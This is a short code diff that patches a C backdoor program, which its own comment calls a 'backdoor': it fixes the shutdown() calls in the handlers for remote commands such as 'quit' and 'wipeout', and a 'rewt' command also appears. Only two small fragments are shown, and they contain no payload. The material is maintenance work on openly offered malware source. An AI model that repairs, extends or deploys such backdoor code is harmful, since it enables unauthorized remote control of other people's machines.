@@ -152,7 +152,7 @@ command ()
 	    }
 	  if ((strstr (cmd_dat, "quit")) == cmd_dat)
 	    {
-	      shutdown(newfd);
+	      shutdown(newfd, SHUT_RDWR);
 	      close (newfd);
 	    }
 	  if ((strstr (cmd_dat, "rewt")) == cmd_dat)
@@ -163,7 +163,7 @@ command ()
 	  if ((strstr (cmd_dat, "wipeout")) == cmd_dat)
 	    {
 	      send (newfd, "Your a dumb fuck for trying to use this command, HEH!\n", 54, 0);
-	      shutdown(newfd);
+	      shutdown(newfd, SHUT_RDWR);
 	      close(newfd);
               exit(0); // exit backdoor, they are not worthy of using it lol
 	    }
